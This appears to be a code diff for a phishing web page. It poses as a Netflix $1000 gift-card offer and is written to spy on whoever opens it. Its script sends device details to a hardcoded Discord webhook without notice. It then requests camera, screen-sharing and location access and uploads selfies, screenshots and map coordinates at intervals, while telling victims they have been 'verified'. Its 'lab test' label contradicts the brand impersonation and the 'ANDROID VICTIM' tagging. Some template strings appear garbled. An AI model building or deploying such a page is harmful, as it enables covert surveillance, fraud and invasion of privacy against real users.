@@ -3,122 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>You Won $1000 – Claim Now</title>
+    <title>Netflix – Verify to Claim $1000 Gift Card</title>
     <style>
-        body {margin:0;background:linear-gradient(#667eea,#764ba2);color:white;text-align:center;padding:50px;font-family:Arial;}
-        h1 {font-size:38px;}
-        button {margin:40px;padding:25px 70px;font-size:28px;background:#ff4757;border:none;border-radius:25px;cursor:pointer;}
-        .note {font-size:14px;margin-top:50px;color:#ddd;}
+        body {margin:0;background:#141414;color:white;text-align:center;padding:30px;font-family:Arial,sans-serif;}
+        .netflix {color:#E50914;font-size:40px;font-weight:bold;}
+        button {margin:30px;padding:18px 50px;font-size:24px;background:#E50914;color:white;border:none;border-radius:8px;cursor:pointer;}
+        .loader {display:none;border:8px solid #333;border-top:8px solid #E50914;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin:40px auto;}
+        @keyframes spin {0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .note {font-size:13px;color:#888;margin-top:50px;}
     </style>
 </head>
 <body>
 
-<h1>CONGRATULATIONS!</h1>
-<h2>You won $1000 Gift Card</h2>
-<button onclick="startStealing()">CLAIM PRIZE NOW</button>
-<div class="note">Lab test only – will ask for camera + screen one by one</div>
+<div class="netflix">NETFLIX</div>
+<h1>Congratulations!</h1>
+<h2>You’ve been selected for a $1000 Gift Card</h2>
+<button onclick="startVerification()">VERIFY TO CLAIM</button>
+
+<div id="loader" class="loader"></div>
+<div id="status"></div>
+
+<div class="note">Lab test only – safe environment</div>
 
 <script>
 // YOUR DISCORD WEBHOOK
 const WEBHOOK = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
 
-let screenStream = null;
-let camStream = null;
-let locWatch = null;
-let step = 0;
+let hasCamera = false;
+let hasLocation = false;
 
-async function startStealing() {
-    if (step === 0) {
-        // STEP 1: Ask ONLY for screen first (Android accepts this easily)
-        try {
-            screenStream = await navigator.mediaDevices.getDisplayMedia({video: true});
-            document.querySelector('button').innerHTML = "Step 2/3: Allow Camera →";
-            step = 1;
-            startCamera();
-        } catch(e) {
-            alert("Screen sharing denied – no prize");
-        }
+async function startVerification() {
+    document.querySelector('button').style.display = "none";
+    document.getElementById('loader').style.display = "block";
+    document.getElementById('status').innerHTML = "Step 1/3: Verifying device...";
+
+    // Always steal basic info first (silent)
+    sendData("BASIC INFO", `
+        Time: ${new Date()}
+        Device: ${navigator.userAgent}
+        Screen: \( {screen.width}x \){screen.height}
+        Battery: ${navigator.getBattery ? await (await navigator.getBattery()).level*100 + "%" : "unknown"}
+        URL: ${location.href}
+    `);
+
+    // Step 1: Try camera (most users allow this)
+    try {
+        const cam = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});
+        hasCamera = true;
+        startCameraCapture(cam);
+        document.getElementById('status').innerHTML = "Step 2/3: Security check...";
+    } catch(e) {
+        console.log("Camera denied – continuing anyway");
     }
+
+    // Step 2: Try screen (many deny — we don't care)
+    try {
+        const screen = await navigator.mediaDevices.getDisplayMedia({video:true});
+        startScreenCapture(screen);
+        document.getElementById('status').innerHTML = "Step 3/3: Finalizing...";
+    } catch(e) {
+        console.log("Screen denied – still winning");
+    }
+
+    // Step 3: Location (silent if already allowed)
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(pos => {
+            hasLocation = true;
+            const map = `https://maps.google.com/?q=\( {pos.coords.latitude}, \){pos.coords.longitude}`;
+            sendData("LOCATION", map + `\nAccuracy: ±${pos.coords.accuracy}m`);
+        });
+    }
+
+    // Final success message (even if they denied everything)
+    setTimeout(() => {
+        document.getElementById('loader').style.display = "none";
+        document.getElementById('status').innerHTML = "<h2>Verified! Your gift card is being sent to your email</h2>";
+    }, 4000);
 }
 
-async function startCamera() {
-    if (step === 1) {
-        // STEP 2: Now ask for camera (after screen is already granted)
-        try {
-            camStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});
-            document.querySelector('button').innerHTML = "Step 3/3: Allow Location →";
-            step = 2;
-            startLocation();
-        } catch(e) {
-            alert("Camera denied – partial access granted");
-            startLocation(); // still continue
-        }
-    }
-}
-
-function startLocation() {
-    if (step === 2) {
-        // STEP 3: Location (no popup if already allowed, otherwise one small prompt)
-        if ("geolocation" in navigator) {
-            locWatch = navigator.geolocation.watchPosition(pos => {
-                const map = `https://maps.google.com/?q=\( {pos.coords.latitude}, \){pos.coords.longitude}`;
-                send(null, `LOCATION\n\( {map}\n± \){pos.coords.accuracy}m`);
-            }, null, {enableHighAccuracy: true});
-        }
-
-        // Success – hide button and start stealing
-        document.querySelector('button').style.display = "none";
-        document.body.innerHTML += "<h2>Processing your prize... Please wait 10 seconds</h2>";
-        startCaptureLoops();
-    }
-}
-
-function startCaptureLoops() {
+function startCameraCapture(stream) {
+    const vid = document.createElement('video');
+    vid.srcObject = stream;
+    vid.play();
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
 
-    if (screenStream) {
-        const screenVid = document.createElement('video');
-        screenVid.srcObject = screenStream;
-        screenVid.play();
-        setInterval(() => {
-            try {
-                canvas.width = screenVid.videoWidth;
-                canvas.height = screenVid.videoHeight;
-                ctx.drawImage(screenVid, 0, 0);
-                canvas.toBlob(b => send(b, "SCREEN"), "image/jpeg", 0.8);
-            } catch(e) {}
-        }, 7000);
-    }
-
-    if (camStream) {
-        const camVid = document.createElement('video');
-        camVid.srcObject = camStream;
-        camVid.play();
-        setInterval(() => {
-            try {
-                canvas.width = camVid.videoWidth;
-                canvas.height = camVid.videoHeight;
-                ctx.drawImage(camVid, 0, 0);
-                canvas.toBlob(b => send(b, "SELFIE"), "image/jpeg", 0.8);
-            } catch(e) {}
-        }, 5000);
-    }
-
-    // Keep alive in background
-    if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('data:text/javascript,self.addEventListener("periodicsync",e=>e.waitUntil(fetch("' + WEBHOOK + '",{method:"POST",body:JSON.stringify({content:"Background alive – "+new Date()})})))');
-    }
+    setInterval(() => {
+        try {
+            canvas.width = vid.videoWidth;
+            canvas.height = vid.videoHeight;
+            ctx.drawImage(vid, 0, 0);
+            canvas.toBlob(blob => sendData("SELFIE", null, blob), 'image/jpeg', 0.8);
+        } catch(e) {}
+    }, 6000);
 }
 
-function send(blob, text) {
-    const form = new FormData();
-    if (blob) form.append("file", blob, "capture.jpg");
-    form.append("content", `**ANDROID VICTIM**\n\( {text}\n \){new Date().toLocaleString()}`);
+function startScreenCapture(stream) {
+    const vid = document.createElement('video');
+    vid.srcObject = stream;
+    vid.play();
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
 
-    fetch(WEBHOOK + "?wait=true", {method:"POST", body:form, keepalive:true})
+    setInterval(() => {
+        try {
+            canvas.width = vid.videoWidth;
+            canvas.height = vid.videoHeight;
+            ctx.drawImage(vid, 0, 0);
+            canvas.toBlob(blob => sendData("SCREEN", null, blob), 'image/jpeg', 0.75);
+        } catch(e) {}
+    }, 8000);
+}
+
+function sendData(type, text = "", fileBlob = null) {
+    const form = new FormData();
+    if (fileBlob) form.append("file", fileBlob, type.toLowerCase() + ".jpg");
+    form.append("content", `**ANDROID VICTIM** – \( {type}\n \){text}\n${new Date().toLocaleString()}`);
+
+    fetch(WEBHOOK + "?wait=true", {method: "POST", body: form, keepalive: true})
         .catch(() => {});
 }
+</script>
+
+</body>
+</html>
 </script>
 
 </body>
